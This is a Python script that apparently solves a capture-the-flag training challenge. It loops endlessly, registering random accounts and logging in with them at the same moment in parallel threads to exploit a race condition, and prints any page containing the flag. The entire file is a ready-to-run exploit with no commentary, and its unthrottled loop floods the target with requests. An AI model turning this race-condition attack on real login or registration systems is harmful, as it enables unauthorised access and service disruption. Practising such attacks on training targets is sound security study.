import requests
import threading
import random
import string

baseUrl = "http://aart.training.jinblack.it/"

def random_string(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

def login(username, password):
    url = "%s/login.php" % baseUrl
    data = {"username": username, "password": password}
    r = requests.post(url, data=data)
    if "flag" in r.text:
        print(r.text)
    return r.text

def register(username, password):
    url = "%s/register.php" % baseUrl
    data = {"username": username, "password": password}
    r = requests.post(url, data=data)
    return r.text

while True:
    #s = requests.Session()
    user = random_string()
    passw = random_string()

    t1 = threading.Thread(target=register, args=(user,passw))
    t2 = threading.Thread(target=login, args=(user,passw))

    t1.start()
    t2.start()
    print(user, passw)

    t1.join()
    t2.join()
    #time.sleep(0.1)